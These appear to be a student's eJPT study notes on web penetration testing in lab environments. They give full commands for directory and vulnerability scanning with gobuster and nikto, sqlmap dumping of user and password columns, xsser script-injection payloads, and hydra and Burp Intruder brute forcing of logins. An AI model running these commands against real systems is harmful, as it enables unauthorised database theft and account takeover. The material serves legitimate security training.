## Web intro
- Basic website
1. HTML
2. CSS
3. Javascript

#### Common servers
Webservers:
- Apache
- Nginx
- Tomcat
- Microsoft IIS on windows servers

Off premise (cloud) hosting:
- AWS
- Azure
- wordpress
- firebase
- cloudflare

#### Main Protocol
- HTTPS
req-res

standard req
- Method (get/post/head/options etc)
- Directory
- Host
- cookie
- User-agent etc etc
- Body

standard res
- status code
200  ok
302 redirect
404 not found etc

Random notes:
- HTTPS encrpyted cant see traffic when proxied
- PHP language used commonly by apache servers (replaced by javascript in a sense)

Tried something new here and did the labs before the vids ðŸ†’

Demo:
Enumerate the site methods

- allowed methods
`curl -X OPTIONS https://target-1/index.php -k -i`
or
burpsuite proxy then repeater change GET to OPTIONS

Get, Head, Options are allowed

- dir crawling
`gobuster dir -u http://192.111.38.3/ -w /usr/share/wordlists/dirb/common.txt`

burpsuite
Intruder - sniper on get request (set the curly symbol thing for dir /&&) 
404 - not found
200/301 - dir exists (moved permanently)

- burpsuite passive crawling (target tab....)


ZAProxy (new to me)
- scan the web app
- opensource cool
- Provides a HUD over the browser allowing use of tools as i browse. cool
- Auto attack things in dir and flags out possible attack vectors and allows replay

Nikto
`nikto -h http://target-1/`

- scans from the root and dumps all possible attack vectors ðŸ¤¯
- LFIs found, RFIs found, sus directories(eg /config /robots.txt /phpmyadmin)
- Everything listed out in a (not so human readable) way

- scan the specific file inclusion dir
`nikto -h http://target-1/index.php?page=arbitrary-file-inclusion.php -Display V -Tuning 5`
- saving the ouput in a html file to be viewed from browser (can save for msf etc)
`nikto -h http://target-1/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm`
- Access the HTML file at `file:///root/nikto.html` from the browser

## SQLmap

###### Inject in GET param
`sqlmap -u "http://192.22.112.3/sqli_1.php?title=asdas&action=search" -p "title" --cookie="PHPSESSID=5q5haa0cb594lr184mo6dfvoq5; security_level=0"`

-> ouputs some payloads u can try manually. They all gave sql syntax error (meaning it is possible to inject)
cookie needed for authentication. Make sure "=" used instead of ":" when taken directly from browser instead of burpsuite

Auto dump the sql databases
`sqlmap -u "http://192.22.112.3/sqli_1.php?title=asdas&action=search" -p "title" --cookie="PHPSESSID=5q5haa0cb594lr184mo6dfvoq5; security_level=0" --dbs`

Dump tables from a database (could also dump all tgt)
`sqlmap -u "http://192.22.112.3/sqli_1.php?title=asdas&action=search" -p "title" --cookie="PHPSESSID=5q5haa0cb594lr184mo6dfvoq5; security_level=0" -D bWAPP --tables`

Dumps columns from the chosen table
`sqlmap -u "http://192.22.112.3/sqli_1.php?title=asdas&action=search" -p "title" --cookie="PHPSESSID=5q5haa0cb594lr184mo6dfvoq5; security_level=0" -D bWAPP -T users --columns`

Dumps all entries from those columns (admin/password/email)
`sqlmap -u "http://192.22.112.3/sqli_1.php?title=asdas&action=search" -p "title" --cookie="PHPSESSID=5q5haa0cb594lr184mo6dfvoq5; security_level=0" -D bWAPP -T users -C admin,passwords,email --dump`


##### Inject in Post param





## XSSER
Note: u did all this in EJPT1 before

#### Post req XSS
`xsser --url "http://192.18.103.3/index.php?page=dns-lookup.php" -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`
-p can be found when using burpproxy for the request
- replace the param u want to try XSS with "XSS"
- ie the target_host here

Custom XSS payload
`xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"`

#### Get req XSS
`xsser --url "http://192.18.103.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=hello&user-poll-php-submit-button=Submit+Vote"`

custom payload
`xsser --url "http://192.18.103.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=hello&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert('hacked')</script>"`


## HTTP brute force hydra

### Post method login page bf
- -L and -P where preset in demo to save time but set it to watever
- params needed is:
	- dir to bf
	- post params (get from inspect network or burpsuite)
	- set the param to bf with ^USER^ or ^PASS^ respectively (else leave as anyt)
	- The message for invalid credentials to verify bf ("Invalid credential or .......")
`hydra -L users.txt -P passwords.txt 192.97.114.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"`

## Burpsuite dictionary attack

Cool demo

/basic page opens a pop up to login

burpsuite proxy to intercept the request send when logging in.
A req like below is send 
```http
GET /basic HTTP/1.1
Host: 192.47.233.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=74eqmmm4glo4sqi12p0pm7m2m1; security_level=0
Upgrade-Insecure-Requests: 1
Authorization: Basic YXNkYXNkOmFzZGFzZGFzZGFzZA==

```

Authorization header changes based on what logins are sent
Using burpsuite, 
Decoding `YXNkYXNkOmFzZGFzZGFzZGFzZA==` from base64 give the credentials i tried to login with (ie asdasd:asdasdasdasd)

Using intruder sniper mode
- Set such that the auth changes based on the wordlist
```http
GET /basic HTTP/1.1
Host: 192.47.233.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=74eqmmm4glo4sqi12p0pm7m2m1; security_level=0
Upgrade-Insecure-Requests: 1
Authorization: Basic Â§YXNkYXNkOmFzZGFzZGFzZGFzZA==Â§
```

At payloads tab load in the standard wordlist 
/root/Desktop/wordlists/100-common-passwords.txt

Below it, at the payload processing part to add:
1. Add "admin:" prefix infront of every password to use as username
2. Encode all to base64 before sending
Attack.

Result with response 301 or 200 worked
- its given back in base64 so
- Send payload to decoder
Here creds, admin:cookie1


## ZAP to bruteforce login
Theres a fuzzing tool 
- after creating some POST reqs from the manual explore page
- go tools -> fuzz -> select the POST req 
- highlight the fields to change (ie login then password)
- click add and add a file or string to FUZZ with
- code 302 found for the right creds


Done with EJPTv2 good luck have fun.ðŸ¥³